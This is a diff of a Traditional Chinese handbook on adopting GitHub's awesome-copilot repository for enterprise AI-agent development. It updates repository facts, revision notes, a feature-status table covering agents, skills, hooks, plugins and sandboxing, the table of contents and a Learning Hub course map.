@@ -10,11 +10,11 @@ categories = ['教學']
 
 > **企業軟體開發團隊使用 awesome-copilot 建立 AI Agent Development Platform 的完整實戰教科書**
 >
-> Repository：[`github.com/github/awesome-copilot`](https://github.com/github/awesome-copilot)（owner：GitHub 官方 org，MIT License，38k+ Stars，內容為社群貢獻）
+> Repository：[`github.com/github/awesome-copilot`](https://github.com/github/awesome-copilot)（owner：GitHub 官方 org，MIT License，38k+ Stars、4.8k+ Forks、494 位貢獻者，內容為社群貢獻）
 >
 > 官方網站：[`awesome-copilot.github.com`](https://awesome-copilot.github.com/)（含 Learning Hub、`llms.txt`）
 >
-> 查證日期：2026-08-27
+> 查證日期：2026-08-27（初版）／2026-08-28（第二版複查：Repository 現況、External Plugins 審查流程、Plugin 宣告式安裝、企業級 Plugin 標準、VS Code Agent／Skill 規格細節）／2026-08-28（第三版增修：VS Code 官方 Agent Harness／Session Target／Agent Host 定義釐清、Agent Sandboxing、Chat Customizations Evaluations 與 Waza 評測、Agent Customizations 編輯器、Copilot SDK、awesome-copilot AI 供應鏈治理資源盤點）
 >
 > 適用對象：資深軟體工程師、Tech Lead、Software Architect、AI Architect、DevSecOps 工程師
 >
@@ -46,7 +46,11 @@ categories = ['教學']
 
 7. **License 聲明**：awesome-copilot 授權條款請以官方 Repository 的 `LICENSE`（MIT）逐字內容為準，本手冊不構成法律意見。
 
-8. 官方權威來源與研究來源分級，請見第 41 章「References」。
+8. 官方權威來源與研究來源分級，請見第 40 章「References」。
+
+9. **第二版複查（2026-08-28）新增／修正的重點**：`plugin.json` 的內容組合欄位在 awesome-copilot 已改為宣告式的 `extensions.com.github.awesome-copilot`（第 11.3 節已重寫）、外部 Plugin 改走 `plugins/external.json` 的 Issue 審查流程（第 11.5 節新增）、Plugin 可用 `enabledPlugins` 宣告式安裝（第 12.6 節新增）、企業可用 `managed-settings.json` 集中管控 Plugin 標準（第 20.5 節新增）。舊版本手冊若已列印或分發，請以本版為準。
+
+10. **第三版增修（2026-08-28）新增／修正的重點**：VS Code 官方文件已把「**Agent Harness**」定義為 Local／Copilot／Claude／Codex 四種**執行時（runtime）**，與本手冊第 6.6 節所稱的「四種 Copilot 使用介面」是**兩個不同軸線**，第 6.7 節新增專節釐清，並補上 Session Target、Agent Host、Code Isolation（folder／worktree）三個新概念；另新增 Agent Sandboxing（第 20.6 節）、Skill／Agent 品質評測工具鏈 Chat Customizations Evaluations 與 Waza（第 8.11 節）、Agent Customizations 編輯器與使用者客製化遷移（第 9.6 節）、Copilot SDK（第 4.6 節）、awesome-copilot AI 供應鏈治理資源盤點（第 2.9 節）、Troubleshooting 診斷流程（第 27.2 節）、VS Code 原生 Claude／Codex Harness 對跨工具標準的影響（第 33.4 節）。
 
 ---
 
@@ -93,13 +97,18 @@ categories = ['教學']
 | Repository | `github/awesome-copilot`（owner：GitHub 官方 org） | 官方已實作 |
 | 定位（README 原文，2026-08-27 複查） | "A community-created collection of custom agents, instructions, skills, hooks, workflows, and plugins to supercharge your GitHub Copilot experience." | Source-confirmed |
 | License | MIT | 官方已實作 |
-| Stars | 約 38.3k（2026-08-27 複查，`github.com/github/awesome-copilot` 頁面） | Source-confirmed |
-| 官方網站 | `awesome-copilot.github.com`（含 Learning Hub、`llms.txt`） | Source-confirmed |
-| 現行頂層資源資料夾 | `agents/`、`instructions/`、`skills/`、`plugins/`、`hooks/`、`cookbook/`、`extensions/`、`workflows/`、`website/`、`docs/` | Source-confirmed（GitHub Contents API 實測） |
+| Stars／Forks／Contributors | 約 38.4k Stars、4.8k Forks、494 位貢獻者（2026-08-28 複查，`github.com/github/awesome-copilot` 頁面） | Source-confirmed |
+| 官方網站 | `awesome-copilot.github.com`（含 Learning Hub、`llms.txt`；站台導覽分為 Agents／Instructions／Skills／Canvas Extensions／Plugins／Learning Hub／Contributors） | Source-confirmed |
+| 現行頂層資源資料夾 | `agents/`、`instructions/`、`skills/`、`plugins/`、`hooks/`、`workflows/`、`cookbook/`、`extensions/`、`docs/`、`eng/`、`website/`、`.schemas/` | Source-confirmed（GitHub Contents API 實測，2026-08-28 複查） |
 | 已移除資料夾 | `chatmodes/`、`prompts/`、`collections/`（皆回 404） | Source-confirmed |
+| README 的「What's in this repo」分類 | Agents／Instructions／Skills／Plugins／Cookbook 五類（Hooks 與 Workflows 有獨立目錄但未列在該表中） | Source-confirmed |
+| 外部 Plugin（External Plugins） | `plugins/external.json`，僅接受公開 GitHub Repository，須走 Issue 審查流程，核准後每六個月自動 re-review（見第 11.5 節） | Source-confirmed |
+| Plugin 宣告式安裝 | `enabledPlugins` 欄位，寫在 `~/.copilot/settings.json`（個人）或 `.github/copilot/settings.json`（Repository）；cloud agent 只支援此方式（見第 12.6 節） | 官方已實作 |
+| 企業級 Plugin 標準 | `managed-settings.json` 可定義 Known Marketplaces 與 Default-enabled Plugins（見第 20.5 節） | 官方已實作 |
+| 預設已註冊的 Marketplace | `copilot-plugins`、`awesome-copilot`（兩者皆為 GitHub 官方預設加入） | 官方已實作 |
 | Custom Agents 格式 | `.agent.md`（前身為 `.chatmode.md`，官方已更名） | 官方已實作 |
-| Agent Skills | `SKILL.md`，2025-12-18 GA，與 Claude Code `.claude/skills` 相容 | 官方已實作 |
-| Hooks | `.github/hooks/*.json`，6 個事件，須存在於 default branch | 官方已實作 |
+| Agent Skills | `SKILL.md`，2025-12-18 GA，與 Claude Code `.claude/skills` 相容；遵循開放規範 `agentskills.io/specification`（`name` ≤ 64 字且須等於資料夾名、`description` ≤ 1024 字） | 官方已實作 |
+| Hooks | `.github/hooks/*.json`，6 個事件，須存在於 default branch；**單一檔案即可綁定多個事件**（`hooks` 物件以事件名為 key，見第 13.4 節） | 官方已實作 |
 | Plugins | Agent Plugins 1.0（`plugin.json`），2026-08-12 GA，跨廠商開放標準 | 官方已實作 |
 | Copilot Extensions（GitHub App） | 已於 2025-11-10 23:59 PST 日落，client-side VS Code chat participant extension 不受影響 | Preview／即將淘汰（已淘汰） |
 | Prompt files | `.prompt.md`；`docs.github.com` 與 VS Code 官方頁面**皆仍標示 Public Preview**（2026-08-27 複查，VS Code 頁面另標示「Agent Customizations 編輯器（Preview）」，並有實驗性的「Prompt 遷移至 Skill」功能，顯示官方可能正逐步把 Prompt files 的能力併入 Agent Skills） | Preview |
@@ -107,70 +116,252 @@ categories = ['教學']
 | Copilot cloud agent | 前身為 "Copilot coding agent"，2026-04 前後正式更名，跑在 GitHub Actions 環境的自主非同步代理 | 官方已實作 |
 | Copilot CLI | `npm install -g @github/copilot`，需 Node.js 22+／npm 10+；CLI 本身於 **2026-02-25 GA** | 官方已實作 |
 | Copilot Code Review：Agent Skills／MCP | 2026-07-29 GA，代表 PR 自動審查情境也能使用 Agent Skills 與 MCP（見第 14.2 節） | 官方已實作 |
+| awesome-copilot MCP Server | Repository 自帶一台 MCP Server，可直接搜尋／安裝庫內資源，**執行需 Docker**（見第 2.8 節） | Source-confirmed |
+| `docs/README.*.md` 產生式索引 | `README.agents.md`、`README.instructions.md`、`README.skills.md`、`README.plugins.md`、`README.hooks.md`、`README.workflows.md`，由 CI 自動產生（見第 2.8 節） | Source-confirmed |
+| Copilot 使用介面（本手冊沿用「harness」一詞的舊用法） | VS Code、Copilot CLI、GitHub Copilot app（桌面程式）、Copilot cloud agent 四種；客製化支援度不一（見第 6.6 節） | 官方已實作 |
+| VS Code 官方定義的 Agent Harness | **Local／Copilot／Claude／Codex** 四種執行時；由 Chat 輸入框的 **Session Target** 控制項選擇（見第 6.7 節） | 官方已實作 |
+| Agent Host | 獨立於視窗之外的 Agent 執行程序，讓工作階段可背景執行、跨視窗同步、遠端執行；Copilot harness 即跑在其上 | 官方已實作 |
+| Code Isolation | Folder isolation（直接改當前工作區）／Worktree isolation（另開 Git worktree）；**worktree 是程式碼隔離邊界，不是安全邊界** | 官方已實作 |
+| Agent Sandboxing | OS 層級檔案系統與網路隔離，套用於 `runInTerminal`；macOS 用 Seatbelt、Linux／WSL2 需 `bubblewrap` + `socat`；WSL1 不支援（見第 20.6 節） | Preview |
+| 客製化檔案品質評測 | Chat Customizations Evaluations 擴充套件（Preview）＋ `microsoft/waza` 評測框架，可分析 `SKILL.md`／`*.agent.md`／`*.instructions.md`／`*.prompt.md`（見第 8.11 節） | Preview |
+| Monorepo 父倉庫發現 | `chat.useCustomizationsInParentRepositories`（**預設關閉**），向上尋找 `.git` 後收集其間所有層級的客製化；涵蓋所有客製化類型含 Hooks（見第 6.4 節） | 官方已實作 |
+| 一律載入的指令檔名 | `copilot-instructions.md`、`AGENTS.md`、**`CLAUDE.md`**（VS Code 三者皆視為 always-on instructions） | 官方已實作 |
+| Copilot SDK | Copilot harness 的底層 SDK，亦可供企業自行開發 Agent 應用；awesome-copilot `cookbook/` 收錄範例（含 Java 範例，見第 4.6 節） | 官方已實作 |
 
 ---
 
 <!-- TOC-AUTO-BEGIN -->
+
 ## 目錄（Table of Contents）
+
+> 本目錄涵蓋全書 41 章與所有編號小節，可直接點擊跳轉。未編號的固定小節（Scenario／AI Prompt 範例／本章 Checklist）因每章重複出現，未列入目錄，請於各章末尾閱讀。
 
 **Part I：核心觀念與定位**
 
 - [1. Executive Summary：5 分鐘理解 awesome-copilot](#1-executive-summary5-分鐘理解-awesome-copilot)
+  - [1.1 awesome-copilot 是什麼](#11-awesome-copilot-是什麼)
+  - [1.2 為什麼值得使用](#12-為什麼值得使用)
+  - [1.3 可以解決什麼問題](#13-可以解決什麼問題)
+  - [1.4 如何協助 AI Agent 開發](#14-如何協助-ai-agent-開發)
+  - [1.5 如何協助 Web Application 開發](#15-如何協助-web-application-開發)
+  - [1.6 如何協助 Legacy Reverse Engineering](#16-如何協助-legacy-reverse-engineering)
+  - [1.7 如何協助 Framework Migration](#17-如何協助-framework-migration)
+  - [1.8 如何協助 Security](#18-如何協助-security)
+  - [1.9 如何導入企業](#19-如何導入企業)
+  - [1.10 最推薦的使用方式](#110-最推薦的使用方式)
 - [2. awesome-copilot 是什麼：官方生態系定位](#2-awesome-copilot-是什麼官方生態系定位)
+  - [2.1 Repository 基本事實](#21-repository-基本事實)
+  - [2.2 Community-created resources 的概念](#22-community-created-resources-的概念)
+  - [2.3 Awesome Copilot Website、Learning Hub、llms.txt](#23-awesome-copilot-websitelearning-hubllmstxt)
+  - [2.4 Resource Discovery 與 Marketplace](#24-resource-discovery-與-marketplace)
+  - [2.5 社群貢獻模式](#25-社群貢獻模式)
+  - [2.6 如何挑選第三方 Agent／Skill／Plugin](#26-如何挑選第三方-agentskillplugin)
+  - [2.7 安全性與供應鏈風險](#27-安全性與供應鏈風險)
+  - [2.8 docs/、eng/ 與 awesome-copilot MCP Server](#28-docseng-與-awesome-copilot-mcp-server)
+  - [2.9 awesome-copilot 的 AI 供應鏈與 Agent 治理資源盤點](#29-awesome-copilot-的-ai-供應鏈與-agent-治理資源盤點)
 - [3. 整體架構：GitHub Copilot 客製化五層模型](#3-整體架構github-copilot-客製化五層模型)
+  - [3.1 分層架構圖](#31-分層架構圖)
+  - [3.2 各層如何協作](#32-各層如何協作)
+  - [3.3 與 awesome-copilot 資料夾的對應關係](#33-與-awesome-copilot-資料夾的對應關係)
 - [4. Resource Model 完整介紹](#4-resource-model-完整介紹)
+  - [4.1 資源類型總覽表](#41-資源類型總覽表)
+  - [4.2 Agentic Workflows（gh-aw）補充說明](#42-agentic-workflowsgh-aw補充說明)
+  - [4.3 Cookbook 補充說明](#43-cookbook-補充說明)
+  - [4.4 Canvas Extensions 補充說明](#44-canvas-extensions-補充說明)
+  - [4.5 GitHub Copilot app 與 Automations（新增）](#45-github-copilot-app-與-automations新增)
+  - [4.6 Copilot SDK 與 Agent Host](#46-copilot-sdk-與-agent-host)
 - [5. Agents／Instructions／Skills／Hooks／Plugins／MCP 核心差異](#5-agentsinstructionsskillshookspluginsmcp-核心差異)
+  - [5.1 比較表](#51-比較表)
+  - [5.2 用實際軟體工程案例對照](#52-用實際軟體工程案例對照)
+  - [5.3 核心心法](#53-核心心法)
 
 **Part II：Repository 建置與客製化深入**
 
 - [6. Repository 目錄結構](#6-repository-目錄結構)
+  - [6.1 企業 Web Application Repository 建議配置](#61-企業-web-application-repository-建議配置)
+  - [6.2 哪些目錄屬於哪個系統](#62-哪些目錄屬於哪個系統)
+  - [6.3 Project Scope 與 Personal Scope](#63-project-scope-與-personal-scope)
+  - [6.4 Root Level、Nested 與 Monorepo 設定](#64-root-levelnested-與-monorepo-設定)
+  - [6.5 不同 Copilot Client 的支援差異](#65-不同-copilot-client-的支援差異)
+  - [6.6 四種 Harness 的選用與設定檔對照](#66-四種-harness-的選用與設定檔對照)
+  - [6.7 Session Target、Agent Harness 與 Code Isolation](#67-session-targetagent-harness-與-code-isolation)
 - [7. AGENTS.md、copilot-instructions.md 與 *.instructions.md 深入比較](#7-agentsmdcopilot-instructionsmd-與-instructionsmd-深入比較)
+  - [7.1 三者比較表](#71-三者比較表)
+  - [7.2 AGENTS.md 支援矩陣](#72-agentsmd-支援矩陣最容易寫錯的一段務必逐字核對官方原文)
+  - [7.3 VS Code 設定開關](#73-vs-code-設定開關)
+  - [7.4 指令優先順序](#74-指令優先順序)
+  - [7.5 applyTo 語法範例](#75-applyto-語法範例)
+  - [7.6 企業 Web Application 完整範例](#76-企業-web-application-完整範例)
 - [8. Skills 深入教學與四個企業 Skill 範例](#8-skills-深入教學與四個企業-skill-範例)
+  - [8.1 Agent Skills 的概念](#81-agent-skills-的概念)
+  - [8.2 SKILL.md Frontmatter](#82-skillmd-frontmatter)
+  - [8.3 Skill Directory 與存放位置](#83-skill-directory-與存放位置)
+  - [8.4 自動發現與三段式漸進載入](#84-自動發現與三段式漸進載入)
+  - [8.5 觸發方式](#85-觸發方式)
+  - [8.6 Skill Lifecycle、Versioning、Testing、Security](#86-skill-lifecycleversioningtestingsecurity)
+  - [8.7 Skill 1：Web Application Development](#87-skill-1web-application-development)
+  - [8.8 Skill 2：Reverse Engineering](#88-skill-2reverse-engineering)
+  - [8.9 Skill 3：Framework Migration](#89-skill-3framework-migration)
+  - [8.10 Skill 4：Security Review](#810-skill-4security-review)
+  - [8.11 Skill 與客製化檔案的品質評測：Chat Customizations Evaluations 與 Waza](#811-skill-與客製化檔案的品質評測chat-customizations-evaluations-與-waza)
 - [9. Custom Agents 深入教學與企業 Agent Team](#9-custom-agents-深入教學與企業-agent-team)
+  - [9.1 從 .chatmode.md 到 .agent.md（重要遷移段落）](#91-從-chatmodemd-到-agentmd重要遷移段落)
+  - [9.2 .agent.md 完整 Frontmatter 欄位](#92-agentmd-完整-frontmatter-欄位)
+  - [9.3 存放位置與組織層共享](#93-存放位置與組織層共享)
+  - [9.3.1 Agent 的建立與管理入口（官方已實作）](#931-agent-的建立與管理入口官方已實作)
+  - [9.4 企業 Agent Team Catalog（12 個 Agent）](#94-企業-agent-team-catalog12-個-agent)
+  - [9.5 完整 .agent.md 範例](#95-完整-agentmd-範例)
+  - [9.6 Agent Customizations 編輯器與使用者客製化遷移](#96-agent-customizations-編輯器與使用者客製化遷移)
 - [10. Agent Team 協作架構](#10-agent-team-協作架構)
+  - [10.1 協作拓樸圖](#101-協作拓樸圖)
+  - [10.2 Agent Delegation 與 Handoff](#102-agent-delegation-與-handoff)
+  - [10.3 Context Management 與 Shared Artifacts](#103-context-management-與-shared-artifacts)
+  - [10.4 Review Gates 與 Human Approval](#104-review-gates-與-human-approval)
+  - [10.5 Failure Recovery](#105-failure-recovery)
 - [11. Plugins 深入教學與企業 Plugin 範例](#11-plugins-深入教學與企業-plugin-範例)
+  - [11.1 Plugin 概念（Agent Plugins 1.0）](#111-plugin-概念agent-plugins-10)
+  - [11.2 Plugins vs Copilot Extensions（絕不可混寫）](#112-plugins-vs-copilot-extensions絕不可混寫)
+  - [11.3 plugin.json Schema 與目錄結構](#113-pluginjson-schema-與目錄結構)
+  - [11.4 完整企業 Plugin 範例：Enterprise Web Development Plugin](#114-完整企業-plugin-範例enterprise-web-development-plugin)
+  - [11.5 External Plugins：plugins/external.json 與審查流程](#115-external-pluginspluginsexternaljson-與審查流程)
 - [12. Plugin 安裝與管理](#12-plugin-安裝與管理)
+  - [12.1 Marketplace Discovery](#121-marketplace-discovery)
+  - [12.2 Plugin 安裝、更新、移除、啟用／停用（企業自建 Plugin）](#122-plugin-安裝更新移除啟用停用企業自建-plugin)
+  - [12.3 Version Management 與 Dependency Management](#123-version-management-與-dependency-management)
+  - [12.4 VS Code 使用方式](#124-vs-code-使用方式)
+  - [12.5 Copilot CLI 使用方式](#125-copilot-cli-使用方式)
+  - [12.6 宣告式安裝：enabledPlugins](#126-宣告式安裝enabledplugins)
 - [13. Hooks 深入教學](#13-hooks-深入教學)
+  - [13.1 定義與 Lifecycle](#131-定義與-lifecycle)
+  - [13.2 六個事件](#132-六個事件)
+  - [13.3 設定檔格式與關鍵限制](#133-設定檔格式與關鍵限制)
+  - [13.4 Pre-Change Quality Gate Hook 範例](#134-pre-change-quality-gate-hook-範例)
+  - [13.5 Agent Workflow Hook 範例](#135-agent-workflow-hook-範例)
+  - [13.6 安全性、Logging、Failure Handling](#136-安全性loggingfailure-handling)
 - [14. MCP 整合](#14-mcp-整合)
+  - [14.1 MCP 是什麼](#141-mcp-是什麼)
+  - [14.2 Copilot Agent 如何使用 MCP](#142-copilot-agent-如何使用-mcp)
+  - [14.3 MCP 與 Skill／Plugin 的差異](#143-mcp-與-skillplugin-的差異)
+  - [14.4 各 Client 的設定位置](#144-各-client-的設定位置)
+  - [14.5 .vscode/mcp.json 範例](#145-vscodemcpjson-範例)
+  - [14.6 Web Application 開發常用 MCP 清單](#146-web-application-開發常用-mcp-清單)
+  - [14.7 MCP Server 信任邊界與網域控管](#147-mcp-server-信任邊界與網域控管)
 
 **Part III：企業實戰案例**
 
 - [15. Web Application 開發實戰](#15-web-application-開發實戰)
+  - [15.1 技術堆疊](#151-技術堆疊)
+  - [15.2 開發流程](#152-開發流程)
+  - [15.3 各階段對應的客製化資源](#153-各階段對應的客製化資源)
 - [16. 逆向工程實戰](#16-逆向工程實戰)
+  - [16.1 情境輸入](#161-情境輸入)
+  - [16.2 分析流程](#162-分析流程由-reverse-engineering-agent-依-reverse-engineering-skill-執行)
+  - [16.3 最終產出](#163-最終產出)
+  - [16.4 重要限制（重申）](#164-重要限制重申)
 - [17. Framework Migration 實戰](#17-framework-migration-實戰)
+  - [17.1 案例：Spring Boot 3.x → Spring Boot 4.x](#171-案例spring-boot-3x--spring-boot-4x)
+  - [17.2 各階段使用的客製化資源](#172-各階段使用的客製化資源)
+  - [17.3 六大機制如何共同完成 Migration](#173-六大機制如何共同完成-migration)
 - [18. AI-Assisted SDLC](#18-ai-assisted-sdlc)
+  - [18.1 全生命週期圖](#181-全生命週期圖)
+  - [18.2 awesome-copilot 在每個階段的介入方式](#182-awesome-copilot-在每個階段的介入方式)
 - [19. Spec-Driven Development 整合](#19-spec-driven-development-整合)
+  - [19.1 整合流程](#191-整合流程)
+  - [19.2 避免 AI Agent 擴權的防護措施](#192-避免-ai-agent-擴權的防護措施)
 
 **Part IV：治理、安全與導入**
 
 - [20. 企業級 AI Coding Governance](#20-企業級-ai-coding-governance)
+  - [20.1 Governance 模型](#201-governance-模型)
+  - [20.2 安全風險類別](#202-安全風險類別)
+  - [20.3 Governance Workflow](#203-governance-workflow)
+  - [20.4 已知威脅情資（2026，Source-confirmed）](#204-已知威脅情資2026source-confirmed)
+  - [20.5 企業級集中管控：managed-settings.json](#205-企業級集中管控managed-settingsjson)
+  - [20.6 Agent Sandboxing：OS 層級的最後一道防線](#206-agent-sandboxingos-層級的最後一道防線)
 - [21. 社群資源安全評估 Checklist](#21-社群資源安全評估-checklist)
+  - [21.1 Awesome Copilot Resource Security Checklist](#211-awesome-copilot-resource-security-checklist)
+  - [21.2 Risk Level 與對應處理](#212-risk-level-與對應處理)
 - [22. 企業團隊導入方法](#22-企業團隊導入方法)
+  - [22.1 六階段導入模型](#221-六階段導入模型)
+  - [22.2 各階段內容](#222-各階段內容)
 - [23. 團隊標準目錄與資源歸屬](#23-團隊標準目錄與資源歸屬)
+  - [23.1 建議標準目錄](#231-建議標準目錄)
+  - [23.2 資源歸屬建議](#232-資源歸屬建議)
 
 **Part V：Catalog、Prompt 與 Tutorial**
 
 - [24. Agent／Skills／Instructions Catalog](#24-agentskillsinstructions-catalog)
+  - [24.1 Agent Catalog](#241-agent-catalog)
+  - [24.2 Skills Catalog](#242-skills-catalog)
+  - [24.3 Instructions Catalog](#243-instructions-catalog)
 - [25. 實戰 Prompt 範例集](#25-實戰-prompt-範例集)
-- [26. 完整實戰 Tutorial（18 項）](#26-完整實戰-tutorial18-項)
+  - [25.1 Reverse Engineering](#251-reverse-engineering)
+  - [25.2 Framework Upgrade](#252-framework-upgrade)
+  - [25.3 Security Review](#253-security-review)
+  - [25.4 Architecture Review](#254-architecture-review)
+  - [25.5 Web Application Development](#255-web-application-development)
+- [26. 完整實戰 Tutorial（20 項）](#26-完整實戰-tutorial20-項)
+  - [26.1 精選 Tutorial 完整逐步示範](#261-精選-tutorial-完整逐步示範)
 
 **Part VI：維運、比較與總結**
 
 - [27. Troubleshooting](#27-troubleshooting)
+  - [27.1 常見問題對照表](#271-常見問題對照表)
+  - [27.2 Agent Debug Panel 與標準診斷流程](#272-agent-debug-panel-與標準診斷流程)
 - [28. 維護策略](#28-維護策略)
+  - [28.1 版控與變更流程](#281-版控與變更流程)
+  - [28.2 Resource Lifecycle](#282-resource-lifecycle)
 - [29. Upgrade Playbook](#29-upgrade-playbook)
+  - [29.1 Awesome Copilot Upgrade Playbook](#291-awesome-copilot-upgrade-playbook)
+  - [29.2 每個步驟的重點](#292-每個步驟的重點)
 - [30. Agent 成效 KPI](#30-agent-成效-kpi)
+  - [30.1 KPI 清單](#301-kpi-清單)
+  - [30.2 KPI 使用原則](#302-kpi-使用原則)
 - [31. AI Agent Quality Gate](#31-ai-agent-quality-gate)
+  - [31.1 七道 Gate](#311-七道-gate)
+  - [31.2 各 Gate 定義](#312-各-gate-定義)
 - [32. awesome-copilot／Copilot 與其他 AI Coding Agent 比較](#32-awesome-copilotcopilot-與其他-ai-coding-agent-比較)
+  - [32.1 重要提醒](#321-重要提醒)
 - [33. 與 Claude Code 概念映射](#33-與-claude-code-概念映射)
+  - [33.1 相同概念、不同實作](#331-相同概念不同實作)
+  - [33.2 不可直接複製的部分](#332-不可直接複製的部分)
+  - [33.3 如何建立跨 Agent 的標準](#333-如何建立跨-agent-的標準)
+  - [33.4 VS Code 原生 Claude／Codex Harness 對跨工具標準的影響](#334-vs-code-原生-claudecodex-harness-對跨工具標準的影響)
 - [34. Enterprise Awesome Copilot Standard](#34-enterprise-awesome-copilot-standard)
+  - [34.1 Naming Convention](#341-naming-convention)
+  - [34.2 Documentation Standard](#342-documentation-standard)
 - [35. 團隊導入方案分級](#35-團隊導入方案分級)
+  - [35.1 各等級進階條件（建議架構）](#351-各等級進階條件建議架構)
 - [36. 30/60/90 天導入計畫](#36-306090-天導入計畫)
+  - [36.1 Day 1-30：Learning + Pilot](#361-day-1-30learning--pilot)
+  - [36.2 Day 31-60：Standardization + Agent Library](#362-day-31-60standardization--agent-library)
+  - [36.3 Day 61-90：Governance + Enterprise Rollout](#363-day-61-90governance--enterprise-rollout)
 - [37. Cheat Sheet](#37-cheat-sheet)
+  - [37.1 常用 CLI](#371-常用-cli)
+  - [37.2 常用目錄](#372-常用目錄)
+  - [37.3 Agent（.agent.md）最小範例](#373-agentagentmd最小範例)
+  - [37.4 Skill（SKILL.md）最小範例](#374-skillskillmd最小範例)
+  - [37.5 Instructions 最小範例](#375-instructions-最小範例)
+  - [37.6 Plugin（plugin.json）最小範例](#376-pluginpluginjson最小範例)
+  - [37.7 Hook 最小範例](#377-hook-最小範例)
+  - [37.8 MCP 最小範例](#378-mcp-最小範例)
+  - [37.9 Troubleshooting 速查（詳見第 27 章）](#379-troubleshooting-速查詳見第-27-章)
+  - [37.10 Security Checklist 速查（詳見第 21 章）](#3710-security-checklist-速查詳見第-21-章)
 - [38. FAQ](#38-faq)
 - [39. Conclusion](#39-conclusion)
 - [40. References](#40-references)
+  - [40.1 awesome-copilot 相關](#401-awesome-copilot-相關)
+  - [40.2 GitHub Copilot 官方文件](#402-github-copilot-官方文件)
+  - [40.3 VS Code 官方文件](#403-vs-code-官方文件)
+  - [40.4 GitHub Changelog](#404-github-changelog)
+  - [40.5 開放規範與跨產業標準](#405-開放規範與跨產業標準)
+  - [40.6 2026 年資安威脅情資（呼應第 20.4 節）](#406-2026-年資安威脅情資呼應第-204-節)
+  - [40.7 技術堆疊版本參考](#407-技術堆疊版本參考呼應本手冊情境範例引用的版本聲明)
 - [41. 全書 Checklist 總覽](#41-全書-checklist-總覽)
+  - [41.1 安裝與導入 Checklist](#411-安裝與導入-checklist)
+  - [41.2 安全 Checklist](#412-安全-checklist)
+  - [41.3 治理 Checklist](#413-治理-checklist)
+  - [41.4 新人快速上手 Checklist](#414-新人快速上手-checklist)
 <!-- TOC-AUTO-END -->
 
 ---
@@ -238,8 +429,13 @@ awesome-copilot 示範了如何用官方驗證的 `.agent.md`、`SKILL.md`、`pl
 | 定位（README 原文，2026-08-27 複查） | "A community-created collection of custom agents, instructions, skills, hooks, workflows, and plugins to supercharge your GitHub Copilot experience." | Source-confirmed |
 | License | MIT | 官方已實作 |
 | Topics | `agent-skills`、`agents`、`ai`、`awesome`、`custom-agents`、`github-copilot`、`hacktoberfest`、`prompt-engineering` | Source-confirmed |
-| 貢獻者數 | 500+（`.all-contributorsrc` 記錄） | Source-confirmed |
+| Stars／Forks | 約 38.4k／4.8k（2026-08-28 複查） | Source-confirmed |
+| 貢獻者數 | 494 位（2026-08-28 複查，README 底部 Contributors 表格；該表格由自動化流程於**每週日 UTC 03:00** 重新產生） | Source-confirmed |
+| 頂層目錄（2026-08-28 Contents API 實測） | `.github/`、`.schemas/`、`.vscode/`、`agents/`、`cookbook/`、`docs/`、`eng/`、`extensions/`、`hooks/`、`instructions/`、`plugins/`、`skills/`、`website/`、`workflows/` | Source-confirmed |
+| 頂層檔案 | `AGENTS.md`、`README.md`、`CONTRIBUTING.md`、`CODEOWNERS`、`CODE_OF_CONDUCT.md`、`SECURITY.md`、`SUPPORT.md`、`LICENSE`、`context7.json`、`mcp.json`、`package.json` | Source-confirmed |
 | 最後更新 | 持續活躍維護（查證當下最後 push 為查證當日） | Source-confirmed |
+
+> ⚠️ **注意 `docs/` 與 `eng/` 常被漏列**：常見的中文介紹文只列出六到八個「資源資料夾」，但 `docs/`（產生式資源索引）與 `eng/`（驗證與建置腳本）才是企業自建同等機制時最值得參考的兩個目錄（詳見第 2.8 節）。
 
 ### 2.2 Community-created resources 的概念
 
@@ -255,30 +451,54 @@ awesome-copilot 收錄的每一份 Agent、Skill、Instructions、Plugin、Hook�
 
 | 資源 | 說明 | 狀態 |
 |---|---|---|
-| 官網 | `https://awesome-copilot.github.com/`，提供依類別瀏覽（Agents／Instructions／Skills／Plugins／Canvas Extensions／Learning Hub）與每個項目的「Copy Install」按鈕 | Source-confirmed |
-| Learning Hub | 官網導覽列的教學文章區，收錄 CLI 進階課程、workshop 系列、Agents/Skills/MCP 基礎導引等文章 | Source-confirmed |
+| 官網 | `https://awesome-copilot.github.com/`，提供依類別瀏覽（Agents／Instructions／Skills／Plugins／Canvas Extensions／Learning Hub／Contributors）與每個項目的「Copy Install」按鈕 | Source-confirmed |
+| Learning Hub | 官網導覽列的教學文章區，已分為 Getting Started／Fundamentals／Reference／Hands-on 四區（清單見下方） | Source-confirmed |
 | `llms.txt` | `https://awesome-copilot.github.com/llms.txt`，machine-readable 索引檔，開頭聲明："A community-driven collection of custom agents, instructions, and skills to enhance GitHub Copilot experiences across various domains, languages, and use cases." | Source-confirmed |
+
+**Learning Hub 現行課程地圖（2026-08-28 複查，Source-confirmed）**
+
+| 區塊 | 內容 | 企業導入時的用途 |
+|---|---|---|
+| Getting Started | GitHub Copilot app（桌面程式，可平行指揮多個 Agent、使用隔離 worktree）、Using Automations in Copilot app、Working with Canvas Extensions（`/create-canvas`） | 評估是否導入「多 Agent 平行作業」工作模式 |
+| Getting Started（Terminal） | Copilot CLI for Beginners（含 00-07 七單元與 YouTube 影片系列）、**Advanced GitHub Copilot CLI**（以 legacy multi-stack 應用為題材，涵蓋 AI 基礎建設、Hooks、LSP／MCP 整合、Plugin） | Advanced 課程的情境與本手冊第 16-17 章（逆向工程、Framework Migration）高度重疊，建議列為 Pilot 階段指定教材 |
+| Getting Started（Workshop） | Hands-on with GitHub Copilot's agents：以共同的 Tailspin Toys backlog 跨**四種 harness**（VS Code／Copilot CLI／Copilot app／cloud agent）實作 | 驗證企業客製化資源在不同 harness 的行為差異（見第 6.6 節） |
+| Fundamentals | What are Agents, Skills, and Instructions、Agents and Subagents、Understanding Copilot Context、Copilot Configuration Basics、Defining Custom Instructions、Creating Effective Skills、Building Custom Agents、Understanding MCP Servers、Automating with Hooks、Agentic Workflows、Using the Copilot Coding Agent、Installing and Using Plugins、Before/After Customization Examples | Phase 1 Awareness（第 22 章）的現成教材清單 |
+| Reference | GitHub Copilot Terminology Glossary | 解決企業內部術語不一致（尤其 coding agent → cloud agent 這類更名） |
+| Hands-on | Cookbook（可直接使用的範例與 recipe） | 對應 Repository 的 `cookbook/` 目錄 |
 
 > ⚠️ 各資源分類的精確數量（例如「175 個 Agent」）在查證當下**無法取得可靠且一致的官方統計**（不同來源數字有落差）。企業內部文件若要引用數量，建議在撰寫當天重新用官方網站或 API 清點，而不是沿用本手冊或任何第三方部落格的舊數字（官方目前沒有找到足夠資料確認此功能）。
 
 ### 2.4 Resource Discovery 與 Marketplace
 
